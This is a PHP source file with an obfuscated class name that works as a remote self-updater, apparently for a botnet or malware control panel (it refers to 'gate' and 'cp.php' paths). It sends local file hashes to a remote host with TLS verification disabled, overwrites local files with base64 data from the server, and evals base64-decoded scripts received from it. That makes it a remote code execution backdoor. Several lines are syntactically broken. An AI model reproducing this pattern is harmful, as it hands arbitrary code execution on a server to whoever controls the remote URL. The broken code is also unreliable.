<?php


class x5wacf8
{
	protected $url;
	protected $ustamp = 0;
	protected $cpFile;
	public $license;

	public function __construct($url)
	{
		$this->url = $url;
		$file = __DIR__ . '/ustamp';

		if (file_exists($file)) {
			$this->ustamp = intval(file_get_contents($file));
		}
	}

	static public function getFiles($root, $withInstall = NULL, $cpFile = NULL)
	{
		$dirs = array('', '/system', '/theme', '/gate', '/gate/libs');

		if ($withInstall) {
			$dirs[] = '/install';
		}

		$result = array();

		foreach ($dirs as $dir) {
			$files = glob($root . $dir . '/*');

			foreach ($files as $file) {
				if (is_file($file)) {
					$name = $dir . strrchr($file, '/');

					if ($name == $cpFile) {
						$name = '/cp.php';
					}

					$result[] = array('file' => $name, 'hash' => md5_file($file));
				}
			}
		}

		return $result;
	}

	public function check($withData = false)
	{
		$files = self::getFiles(__DIR__ . '/..', true, self::cpFile());
		$data = array('action' => 'get', 'ustamp' => $this->ustamp, 'files' => $files, 'license' => $this->license, 'version' => PHP_MAJOR_VERSION . PHP_MINOR_VERSION, 'withData' => intval($withData));
		$options = array(
			'http' => array('header' => 'Content-type: application/x-www-form-urlencoded' . "\r\n", 'method' => 'POST', 'content' => http_build_query($data)),
			'ssl'  => array('verify_peer' => false, 'allow_self_signed' => true, 'verify_peer_name' => false, 'verify_host' => false)
			);
		$context = stream_context_create($options);
		$result = file_get_contents($this->url, false, $context);
		return $result ? json_decode($result) : NULL;
	}

	public function update(&$error)
	{
		$response = $this->check(true);

		if (!$response) {
			$error = 'Repository unavailable';
			return NULL;
		}

		foreach ($response->files as $item) {
			if ($item->file == '/cp.php') {
				$item->file = self::cpFile();
			}

			if (!file_put_contents(__DIR__ . '/..' . $item->file, base64_decode($item->data))) {
				$error = 'Couldn\'t update ' . $item->file;
				return NULL;
			}
		}

		foreach ($response->scripts as $data => ) {
			$stamp = $this->check(true);
			$st = eval base64_decode($data);

			if (!$st) {
				$error = 'Couldn\'t exec ' . $stamp;
				return NULL;
			}

			file_put_contents(__DIR__ . '/ustamp', $stamp);
		}

		return true;
	}

	static public function cpFile()
	{
		$buf = strrchr($_SERVER['REQUEST_URI'], '/');
		return substr($buf, 0, strpos($buf, '.php') + 4);
	}
}


?>
